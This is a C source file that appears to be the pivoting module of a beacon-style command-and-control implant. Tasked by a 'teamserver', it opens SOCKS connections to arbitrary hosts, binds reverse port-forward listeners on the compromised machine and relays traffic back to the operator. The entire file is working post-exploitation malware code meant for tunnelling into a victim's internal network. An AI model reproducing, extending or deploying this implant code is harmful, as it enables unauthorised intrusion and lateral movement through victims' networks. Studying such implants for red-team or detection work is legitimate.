#include "pivot.h"
#include "beacon.h"
#include "commands.h"
#include "debug.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

/*
 * SOCKS / rportfwd implant side (official pivot.cpp + BeaconProxyListener).
 *
 * Tasks from teamserver:
 *   CONNECT (14): [id:4 BE][port:2 BE][host bytes]
 *   SEND    (15): [id:4 BE][data...]
 *   CLOSE   (16): [id:4 BE]
 *   LISTEN  (17): [id:4 BE][port:2 BE]          SOCKS BIND (one-shot)
 *   LSOCKET_BIND (50): [port:2 BE]               rportfwd (0.0.0.0)
 *   LSOCKET_BIND_LOCALHOST (102): [port:2 BE]    rportfwd (127.0.0.1)
 *   LSOCKET_CLOSE (51): [port:2 BE]
 *
 * Callbacks to teamserver:
 *   CALLBACK_CONNECT (6): [id:4 BE]
 *   CALLBACK_CLOSE   (4): [id:4 BE]
 *   CALLBACK_READ    (5): [id:4 BE][data]
 *   CALLBACK_ACCEPT (23): [id:4 BE][lport:4 BE]  rportfwd new connection
 */

typedef struct socket_entry {
    uint32_t id;
    int      state;
    int      socket;
    uint32_t ltype;
    uint16_t lport;
    uint64_t start_time;
    uint32_t timeout_ms;
    uint64_t linger_time;
    struct socket_entry *next;
} socket_entry_t;

static socket_entry_t *g_pivot_list = NULL;
static char *g_read_buffer = NULL;
static uint32_t g_lsock_id = 0;

static uint64_t mono_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000ull + (uint64_t)ts.tv_nsec / 1000000ull;
}

static uint32_t next_id(void) {
    return (g_lsock_id++ % 67108864u) + 67108864u;
}

static void set_nonblock(int fd) {
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0)
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
}

static void add_socket(int fd, uint32_t id, uint32_t timeout_ms,
                       uint32_t ltype, uint16_t lport, int state) {
    socket_entry_t *e, *t;

    /* Invalidate duplicate ids */
    for (t = g_pivot_list; t; t = t->next) {
        if (t->id == id && t->state != STATE_DEAD)
            t->state = STATE_DEAD;
    }

    e = (socket_entry_t *)calloc(1, sizeof(*e));
    if (!e) return;
    set_nonblock(fd);
    e->id = id;
    e->socket = fd;
    e->state = state;
    e->ltype = ltype;
    e->lport = lport;
    e->start_time = mono_ms();
    e->timeout_ms = timeout_ms;
    e->next = g_pivot_list;
    g_pivot_list = e;
    DEBUG_PRINT("[pivot] add id=%u fd=%d state=%d ltype=%u port=%u\n",
                id, fd, state, ltype, lport);
}

static int generic_listen(uint32_t bindto, uint16_t port, int backlog) {
    int fd;
    int opt = 1;
    struct sockaddr_in addr;

    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = bindto;
    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }
    if (listen(fd, backlog) < 0) {
        close(fd);
        return -1;
    }
    set_nonblock(fd);
    return fd;
}

static int is_bound(uint16_t port) {
    socket_entry_t *t;
    for (t = g_pivot_list; t; t = t->next) {
        if (t->state != STATE_DEAD && t->ltype == LISTEN_PERSISTENT && t->lport == port)
            return 1;
    }
    return 0;
}

static void pivot_poll_checker(pivot_callback cb) {
    fd_set rfds, wfds, efds;
    struct timeval tv;
    socket_entry_t *temp;
    int maxfd = -1;
    int ret;

    FD_ZERO(&rfds);
    FD_ZERO(&wfds);
    FD_ZERO(&efds);

    for (temp = g_pivot_list; temp; temp = temp->next) {
        if (temp->state != STATE_CONNECT) continue;
        FD_SET(temp->socket, &rfds);
        FD_SET(temp->socket, &wfds);
        FD_SET(temp->socket, &efds);
        if (temp->socket > maxfd) maxfd = temp->socket;
    }
    if (maxfd < 0) return;

    tv.tv_sec = 0;
    tv.tv_usec = 10000;
    ret = select(maxfd + 1, &rfds, &wfds, &efds, &tv);
    if (ret <= 0) return;

    temp = g_pivot_list;
    while (temp) {
        socket_entry_t *next = temp->next;
        uint32_t fid_be;

        if (temp->state != STATE_CONNECT) {
            temp = next;
            continue;
        }
        fid_be = htonl(temp->id);

        if (temp->ltype == LISTEN_PERSISTENT) {
            if (FD_ISSET(temp->socket, &rfds)) {
                int ns = accept(temp->socket, NULL, NULL);
                if (ns >= 0) {
                    uint32_t nid = next_id();
                    uint8_t msg[8];
                    uint32_t nid_be = htonl(nid);
                    uint32_t port_be = htonl((uint32_t)temp->lport);
                    set_nonblock(ns);
                    add_socket(ns, nid, 180000, LISTEN_NOTREALLY, 0, STATE_READ);
                    memcpy(msg, &nid_be, 4);
                    memcpy(msg + 4, &port_be, 4);
                    DEBUG_PRINT("[pivot] rportfwd accept id=%u port=%u\n", nid, temp->lport);
                    cb((char *)msg, 8, CALLBACK_ACCEPT);
                }
            }
        } else if (temp->ltype == LISTEN_ONEOFF) {
            if (FD_ISSET(temp->socket, &efds)) {
                temp->state = STATE_DEAD;
                cb((char *)&fid_be, 4, CALLBACK_CLOSE);
            } else if (FD_ISSET(temp->socket, &rfds)) {
                int ls = temp->socket;
                int ns = accept(ls, NULL, NULL);
                if (ns < 0) {
                    temp->state = STATE_DEAD;
                    cb((char *)&fid_be, 4, CALLBACK_CLOSE);
                } else {
                    set_nonblock(ns);
                    temp->socket = ns;
                    temp->state = STATE_READ;
                    temp->ltype = LISTEN_NOTREALLY;
                    close(ls);
                    cb((char *)&fid_be, 4, CALLBACK_CONNECT);
                }
            }
        } else {
            /* Outgoing connect in progress */
            if (FD_ISSET(temp->socket, &efds)) {
                temp->state = STATE_DEAD;
                cb((char *)&fid_be, 4, CALLBACK_CLOSE);
            } else if (FD_ISSET(temp->socket, &wfds)) {
                int err = 0;
                socklen_t el = sizeof(err);
                getsockopt(temp->socket, SOL_SOCKET, SO_ERROR, &err, &el);
                if (err == 0) {
                    temp->state = STATE_READ;
                    cb((char *)&fid_be, 4, CALLBACK_CONNECT);
                } else {
                    temp->state = STATE_DEAD;
                    cb((char *)&fid_be, 4, CALLBACK_CLOSE);
                }
            }
        }

        if (temp->state == STATE_CONNECT && temp->timeout_ms > 0 &&
            (mono_ms() - temp->start_time) > temp->timeout_ms) {
            temp->state = STATE_DEAD;
            cb((char *)&fid_be, 4, CALLBACK_CLOSE);
        }
        temp = next;
    }
}

static int pivot_reader(pivot_callback cb) {
    fd_set rfds;
    struct timeval tv;
    socket_entry_t *temp;
    int maxfd = -1;
    int ret;
    int did = 0;

    FD_ZERO(&rfds);
    for (temp = g_pivot_list; temp; temp = temp->next) {
        if (temp->state == STATE_READ) {
            FD_SET(temp->socket, &rfds);
            if (temp->socket > maxfd) maxfd = temp->socket;
        }
    }
    if (maxfd < 0) return 0;

    tv.tv_sec = 0;
    tv.tv_usec = 50000;
    ret = select(maxfd + 1, &rfds, NULL, NULL, &tv);
    if (ret <= 0) return 0;

    if (!g_read_buffer) {
        g_read_buffer = (char *)malloc(SOCKET_READ_MAX);
        if (!g_read_buffer) return 0;
    }

    for (temp = g_pivot_list; temp; temp = temp->next) {
        uint32_t fid_be;
        ssize_t n;
        if (temp->state != STATE_READ || !FD_ISSET(temp->socket, &rfds))
            continue;
        fid_be = htonl(temp->id);
        n = read(temp->socket, g_read_buffer + 4, SOCKET_READ_MAX - 4);
        if (n > 0) {
            memcpy(g_read_buffer, &fid_be, 4);
            cb(g_read_buffer, (int)(n + 4), CALLBACK_READ);
            did = 1;
        } else if (n == 0) {
            temp->state = STATE_DEAD;
            cb((char *)&fid_be, 4, CALLBACK_CLOSE);
        } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
            temp->state = STATE_DEAD;
            cb((char *)&fid_be, 4, CALLBACK_CLOSE);
        }
    }
    return did;
}

static void pivot_reaper(void) {
    socket_entry_t *temp = g_pivot_list;
    socket_entry_t *prev = NULL;

    while (temp) {
        socket_entry_t *next = temp->next;
        if (temp->state == STATE_DEAD && temp->linger_time == 0) {
            temp->linger_time = mono_ms();
            prev = temp;
            temp = next;
            continue;
        }
        if (temp->state == STATE_DEAD &&
            (mono_ms() - temp->linger_time) > 1000) {
            close(temp->socket);
            if (prev) prev->next = next;
            else g_pivot_list = next;
            free(temp);
            temp = next;
            continue;
        }
        prev = temp;
        temp = next;
    }
}

void pivot_init(void) {
    g_pivot_list = NULL;
    g_read_buffer = NULL;
    g_lsock_id = 0;
}

void pivot_poll(pivot_callback cb) {
    int rounds = 0;
    pivot_poll_checker(cb);
    /* Drain readable data briefly so SOCKS feels responsive */
    while (pivot_reader(cb) && rounds++ < 8)
        ;
    pivot_reaper();
}

void pivot_cleanup(void) {
    socket_entry_t *t = g_pivot_list;
    while (t) {
        socket_entry_t *n = t->next;
        close(t->socket);
        free(t);
        t = n;
    }
    g_pivot_list = NULL;
    free(g_read_buffer);
    g_read_buffer = NULL;
}

void command_listen_socks(const uint8_t *buffer, int length, pivot_callback cb) {
    uint32_t id;
    uint16_t port;
    int ls;
    if (length < 6) return;
    id = ntohl(*(uint32_t *)buffer);
    port = ntohs(*(uint16_t *)(buffer + 4));
    DEBUG_PRINT("[pivot] LISTEN id=%u port=%u\n", id, port);
    ls = generic_listen(INADDR_ANY, port, 1);
    if (ls < 0) {
        uint32_t fid = htonl(id);
        cb((char *)&fid, 4, CALLBACK_CLOSE);
    } else {
        add_socket(ls, id, 180000, LISTEN_ONEOFF, port, STATE_CONNECT);
    }
}

void command_connect_socks(const uint8_t *buffer, int length, pivot_callback cb) {
    uint32_t id;
    uint16_t port;
    char host[1024];
    int host_len;
    int fd;
    struct hostent *he;
    struct sockaddr_in addr;
    int ret;

    if (length < 6) return;
    id = ntohl(*(uint32_t *)buffer);
    port = ntohs(*(uint16_t *)(buffer + 4));
    host_len = length - 6;
    if (host_len >= (int)sizeof(host)) host_len = (int)sizeof(host) - 1;
    memcpy(host, buffer + 6, (size_t)host_len);
    host[host_len] = 0;

    DEBUG_PRINT("[pivot] CONNECT id=%u %s:%u\n", id, host, port);

    he = gethostbyname(host);
    if (!he) {
        uint32_t fid = htonl(id);
        cb((char *)&fid, 4, CALLBACK_CLOSE);
        return;
    }
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) {
        uint32_t fid = htonl(id);
        cb((char *)&fid, 4, CALLBACK_CLOSE);
        return;
    }
    set_nonblock(fd);
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr.s_addr, he->h_addr, (size_t)he->h_length);
    ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0 && errno != EINPROGRESS) {
        close(fd);
        {
            uint32_t fid = htonl(id);
            cb((char *)&fid, 4, CALLBACK_CLOSE);
        }
        return;
    }
    add_socket(fd, id, 30000, LISTEN_NOTREALLY, 0, STATE_CONNECT);
}

void command_send_socks(const uint8_t *buffer, int length) {
    uint32_t id;
    socket_entry_t *t;
    const uint8_t *data;
    int dlen;
    int written;

    if (length < 4) return;
    id = ntohl(*(uint32_t *)buffer);
    data = buffer + 4;
    dlen = length - 4;

    for (t = g_pivot_list; t; t = t->next) {
        if (t->id != id || t->state != STATE_READ) continue;
        written = 0;
        while (written < dlen) {
            ssize_t n = write(t->socket, data + written, (size_t)(dlen - written));
            if (n > 0) {
                written += (int)n;
            } else if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                usleep(5000);
            } else {
                t->state = STATE_DEAD;
                break;
            }
        }
        break;
    }
}

void command_close_socks(const uint8_t *buffer, int length) {
    uint32_t id;
    socket_entry_t *t;
    if (length < 4) return;
    id = ntohl(*(uint32_t *)buffer);
    for (t = g_pivot_list; t; t = t->next) {
        if (t->id == id && t->ltype != LISTEN_PERSISTENT) {
            t->state = STATE_DEAD;
            break;
        }
    }
}

void command_socket_bind(const uint8_t *buffer, int length, uint32_t bind_addr) {
    uint16_t port;
    int ls;
    if (length < 2) return;
    port = ntohs(*(uint16_t *)buffer);
    if (is_bound(port)) {
        DEBUG_PRINT("[pivot] already bound %u\n", port);
        return;
    }
    DEBUG_PRINT("[pivot] BIND port=%u addr=0x%08x\n", port, bind_addr);
    ls = generic_listen(bind_addr, port, 10);
    if (ls >= 0) {
        add_socket(ls, next_id(), 0, LISTEN_PERSISTENT, port, STATE_CONNECT);
    } else {
        char msg[64];
        snprintf(msg, sizeof(msg), "bind failed on port %u: %s", port, strerror(errno));
        command_shell_callback(msg, (int)strlen(msg), CALLBACK_OUTPUT_UTF8);
    }
}

void command_socket_close_port(const uint8_t *buffer, int length) {
    uint16_t port;
    socket_entry_t *t;
    if (length < 2) return;
    port = ntohs(*(uint16_t *)buffer);
    DEBUG_PRINT("[pivot] CLOSE port=%u\n", port);
    for (t = g_pivot_list; t; t = t->next) {
        if (t->state == STATE_DEAD) continue;
        if (t->ltype == LISTEN_PERSISTENT && t->lport == port)
            t->state = STATE_DEAD;
    }
}
